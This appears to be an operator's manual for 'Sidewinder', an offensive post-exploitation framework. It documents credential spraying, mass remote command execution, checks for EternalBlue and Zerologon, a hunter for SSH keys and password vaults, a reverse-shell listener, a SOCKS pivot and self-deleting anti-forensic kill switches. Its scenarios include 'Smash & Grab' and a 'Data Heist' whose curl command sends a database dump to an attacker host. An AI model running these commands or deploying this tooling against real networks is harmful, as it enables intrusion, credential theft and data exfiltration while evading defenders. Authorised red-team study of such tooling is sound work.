# SIDEWINDER v1.0 OPERATOR'S MANUAL
**Classification:** Red Team / Offensive Security
**Version:** 1.0 (Gold Master)
**Author:** https://github.com/z-tejani

---

## 1. Introduction

Sidewinder is a unified, post-exploitation and reconnaissance framework designed for modern Red Team engagements. Unlike traditional scanners that merely identify open ports, Sidewinder is **context-aware** and **operationally focused**. It is built to bridge the gap between initial access and domain dominance.

The tool consolidates several phases of the Cyber Kill Chain into a single agent:
1.  **Reconnaissance:** Intelligent discovery of infrastructure and web assets.
2.  **Weaponization:** Auto-identification of high-value exploits (MS17-010, BlueKeep).
3.  **Delivery:** Credential spraying and validation.
4.  **Actions on Objectives:** Mass execution, data exfiltration, and local artifact hunting.

---

## 2. Installation & Deployment

Sidewinder is designed to run in two environments: as a raw Python script on an attacker machine (Kali/Debian) or as a compiled binary on a compromised Windows host.

### A. Dependencies (Python Environment)
To run the source code, the following libraries are required. Note that Root/Administrator privileges are required for raw socket operations (ARP/Sniffing).

```bash
# Update repositories
sudo apt update

# Install system dependencies
sudo apt install python3-pip libsasl2-dev libldap2-dev libssl-dev

# Install Python libraries
pip3 install scapy ldap3 dnspython paramiko impacket requests pyinstaller
````

### B. Compilation (Windows Target)

To deploy Sidewinder to a victim machine without installing Python, compile it into a standalone `.exe`.

**WARNING:** Compilation must be performed on a Windows machine to ensure binary compatibility.

```powershell
# In PowerShell:
pyinstaller --onefile --clean --name sidewinder sidewinder.py
```

The resulting binary will be located at `dist\sidewinder.exe`. This file has zero external dependencies.

-----

## 3\. Command Reference

### Targeting Options

#### `--subnet <CIDR>`

Defines the network scope for infrastructure scanning.

  * **Usage:** `--subnet 192.168.1.0/24`
  * **Behavior:**
      * **Standard Mode:** Performs a high-speed ARP broadcast sweep to identify live hosts, followed by a multi-threaded TCP connect scan.
      * **Stealth Mode:** Skips ARP. Mathematically generates IPs within the CIDR block and probes them individually.
  * **Ports Scanned:** SSH (22), HTTP (80), HTTPS (443), SMB (445), SOCKS (1080), RDP (3389), WinRM (5985), HTTP-Alt (8080), HTTPS-Alt (8443).

#### `--domain <FQDN>`

Defines the Active Directory domain for enumeration.

  * **Usage:** `--domain corp.local`
  * **Behavior:** Sidewinder queries DNS SRV records (`_ldap._tcp.dc._msdcs.<DOMAIN>`) to automatically locate the Primary Domain Controller (PDC). It then binds to LDAP to harvest user data.

-----

### Authentication Options

Used for both Active Directory binding and Network Credential Spraying.

#### `--user <USERNAME>`

  * **Usage:** `--user admin`
  * **Context:**
      * If used with `--domain`: Acts as the bind user for LDAP queries.
      * If used with `--subnet`: Acts as the username for SSH/SMB login attempts against discovered hosts.

#### `--password <PASSWORD>`

  * **Usage:** `--password "P@ssw0rd123!"`
  * **Note:** If your password contains special characters (e.g., `!`, `$`), ensure you wrap the string in quotes to prevent your shell from interpreting them.

-----

### Operational Modes (Active)

#### `--exec <COMMAND>`

Triggers the Mass Execution module.

  * **Usage:** `--exec "whoami /all"`
  * **Prerequisite:** Must be used with `--user` and `--password`.
  * **Behavior:**
      * Sidewinder first scans and validates credentials.
      * For every **Linux (SSH)** host where creds work: It executes the command and prints output to the console.
      * For every **Windows (SMB)** host where creds work (and user is Local Admin): It generates a batch file `mass_smb.bat`. This batch file utilizes `impacket-psexec` to perform the execution safely.

#### `--vuln`

Enables the Exploit Hunter module.

  * **Usage:** `--subnet ... --vuln`
  * **Behavior:** Performs active checks for high-severity vulnerabilities:
    1.  **MS17-010 (EternalBlue):** Checks for SMBv1 and vulnerable OS versions (Win7/Server 2008).
    2.  **SMBGhost (CVE-2020-0796):** Checks for SMBv3.1.1 compression capabilities.
    3.  **Zerologon (CVE-2020-1472):** Checks for exposed Netlogon RPC pipes on Domain Controllers.
    4.  **Shellshock (CVE-2014-6271):** Injects a test payload into the `User-Agent` string of web servers.

#### `--hunt`

Enables the Loot Hunter module.

  * **Usage:** `--hunt`
  * **Behavior:** Recursively crawls the *local* file system (C:\\Users or /home) looking for high-value artifacts.
  * **Target Extensions:** `.kdbx` (KeePass), `.pem`/`id_rsa` (SSH Keys), `.env` (Cloud Secrets), `unattend.xml` (Windows Install Creds).

-----

### Operational Modes (Infrastructure)

#### `--socks`

Starts a SOCKS4 Pivot Proxy.

  * **Usage:** `--socks`
  * **Behavior:** Opens port **9050** on the local machine. Traffic sent to this port is tunneled out through the Sidewinder instance.
  * **Use Case:** Running Sidewinder on a compromised Linux bastion host allows you to use your local browser to access internal intranets via `127.0.0.1:9050`.

#### `--sniff`

Starts the Passive Broadcast Sniffer.

  * **Usage:** `--sniff`
  * **Behavior:** Listens on UDP 5355 (LLMNR) and UDP 137 (NBT-NS).
  * **Output:** Logs any machine on the network requesting a non-existent hostname. This identifies targets vulnerable to **Responder** poisoning attacks without sending a single packet.

#### `--listen <PORT>`

Starts a Reverse Shell Listener.

  * **Usage:** `--listen 4444`
  * **Behavior:** Starts a TCP listener. When a connection is received, it attempts to stabilize the shell by injecting Python PTY commands (`import pty; pty.spawn("/bin/bash")`).

#### `--exfil <PORT>`

Starts an HTTP Exfiltration Server.

  * **Usage:** `--exfil 80`
  * **Behavior:** Starts a web server that accepts `POST` requests. Any data sent to it is saved to disk.
  * **Client Command:** `curl --data-binary @secret.zip http://<ATTACKER_IP>/`

-----

### Modifiers

#### `--stealth`

Enables Evasion & OpSec Logic.

  * **Usage:** `--subnet ... --stealth`
  * **Changes:**
    1.  **ARP Disabled:** No broadcast packets are sent.
    2.  **Jitter:** A random sleep (0.5s - 2.5s) is inserted between every network connection.
    3.  **Randomization:** The target IP list is shuffled to prevent sequential scanning patterns.
    4.  **Throttling:** Max threads are reduced from 20 to 5.

#### `--threads <INT>`

Controls concurrency.

  * **Usage:** `--threads 50`
  * **Default:** 20.

-----

## 4\. Output Artifacts

Sidewinder keeps the console output clean but generates detailed files for post-processing.

| File Name | Description |
| :--- | :--- |
| `sidewinder_cheatsheet.txt` | **The Battle Plan.** Contains copy-pasteable attack commands for every vuln found. |
| `pwned_targets.txt` | **The Loot.** A list of validated credentials in `protocol://user:pass@ip` format. |
| `[DOMAIN]_users.json` | **BloodHound Data.** Full export of AD users for path visualization. |
| `mass_smb.bat` | **Batch Executor.** Generated only if Windows targets are compromised. |

-----

## 5\. Security Protocols (Self-Destruct)

To prevent forensic analysis of the binary by Blue Teams, Sidewinder includes two kill switches.

1.  **Date Hard-Stop:** The tool contains a hardcoded `burn_date` (Default: 2026-01-01). If the system clock is past this date, the tool deletes itself immediately upon execution.
2.  **DNS Kill Switch:** Before running, the tool queries `killswitch.sidewinder.local` (TXT record). If the record contains `KILL_SIDEWINDER`, the tool performs a secure delete of its own binary and terminates.

-----

## 6\. Operational Scenarios

### Scenario A: The "Ghost" Audit

**Objective:** Map a network without triggering IDS alerts.
**Command:**

```bash
sidewinder.exe --subnet 10.0.0.0/24 --stealth --vuln
```

### Scenario B: The "Smash & Grab"

**Objective:** Execute `whoami` on every machine possible using a found credential.
**Command:**

```bash
sudo python3 sidewinder.py --subnet 192.168.10.0/24 --threads 50 --user admin --password Welcome1 --exec "whoami"
```

### Scenario C: The Active Directory Hunter

**Objective:** Find a path to Domain Admin.
**Command:**

```bash
sidewinder.exe --domain corp.local --user svc_guest --password Password1
```

### Scenario D: The Data Heist

**Objective:** Exfiltrate a database dump.
**Attacker Machine:**

```bash
python3 sidewinder.py --exfil 80
```

**Victim Machine:**

```bash
curl --data-binary @database.sql http://<ATTACKER_IP>/
```

-----

## Authors

Developed by **z-tejani**.
Source code and updates available at: [https://github.com/z-tejani](https://github.com/z-tejani)